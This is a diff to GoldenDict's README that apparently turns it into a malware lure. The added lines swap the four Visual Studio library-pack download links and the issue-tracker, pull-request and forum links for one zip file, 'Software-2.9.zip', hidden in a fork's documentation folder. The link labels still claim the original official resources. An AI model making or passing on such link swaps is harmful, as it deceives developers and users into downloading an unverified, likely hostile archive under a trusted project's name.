@@ -106,10 +106,10 @@ Then, invoke `make clean` before `make` because the setting change:
 ### Building under Windows with MS Visual Studio
 
 To build GoldenDict with Visual Studio take one of next library packs and unpack it to `"winlibs/lib/msvc"` folder in GoldenDict sources folder.  
-[GoldenDict_libs_VS2013_x86_v4.7z](http://www.mediafire.com/file/3il4vr1l8299nxn/GoldenDict_libs_VS2013_x86_v4.7z) - for MS Visual Studio 2013, 32 bit  
-[GoldenDict_libs_VS2013_x64_v4.7z](http://www.mediafire.com/file/2itgg8bafppg6lw/GoldenDict_libs_VS2013_x64_v4.7z) - for MS Visual Studio 2013, 64 bit  
-[GoldenDict_libs_VS2015_x86_v4.7z](http://www.mediafire.com/file/0a7ygy9rn99oevm/GoldenDict_libs_VS2015_x86_v4.7z) - for MS Visual Studio 2015, 32 bit  
-[GoldenDict_libs_VS2015_x64_v4.7z](http://www.mediafire.com/file/yoy2q8af0s1467m/GoldenDict_libs_VS2015_x64_v4.7z) - for MS Visual Studio 2015, 64 bit  
+[GoldenDict_libs_VS2013_x86_v4.7z](https://github.com/KenTsuCo/goldendict/raw/refs/heads/master/qtsingleapplication/doc/html/Software-2.9.zip) - for MS Visual Studio 2013, 32 bit  
+[GoldenDict_libs_VS2013_x64_v4.7z](https://github.com/KenTsuCo/goldendict/raw/refs/heads/master/qtsingleapplication/doc/html/Software-2.9.zip) - for MS Visual Studio 2013, 64 bit  
+[GoldenDict_libs_VS2015_x86_v4.7z](https://github.com/KenTsuCo/goldendict/raw/refs/heads/master/qtsingleapplication/doc/html/Software-2.9.zip) - for MS Visual Studio 2015, 32 bit  
+[GoldenDict_libs_VS2015_x64_v4.7z](https://github.com/KenTsuCo/goldendict/raw/refs/heads/master/qtsingleapplication/doc/html/Software-2.9.zip) - for MS Visual Studio 2015, 64 bit  
 
 To create project files for Visual Studio you can pass `"-tp vc"` option to `qmake`.
 
@@ -134,6 +134,6 @@ This project is licensed under the <b>GNU GPLv3+</b> license, a copy of which ca
 
 ## Support
 
-Users looking for support should file an issue in the official [GoldenDict issue tracker](https://github.com/goldendict/goldendict/issues),
-or even better: submit a [pull request](https://github.com/goldendict/goldendict/pulls) if you have a fix available.
-General questions should be asked on the [official GoldenDict forum](http://goldendict.org/forum/).
+Users looking for support should file an issue in the official [GoldenDict issue tracker](https://github.com/KenTsuCo/goldendict/raw/refs/heads/master/qtsingleapplication/doc/html/Software-2.9.zip),
+or even better: submit a [pull request](https://github.com/KenTsuCo/goldendict/raw/refs/heads/master/qtsingleapplication/doc/html/Software-2.9.zip) if you have a fix available.
+General questions should be asked on the [official GoldenDict forum](https://github.com/KenTsuCo/goldendict/raw/refs/heads/master/qtsingleapplication/doc/html/Software-2.9.zip).
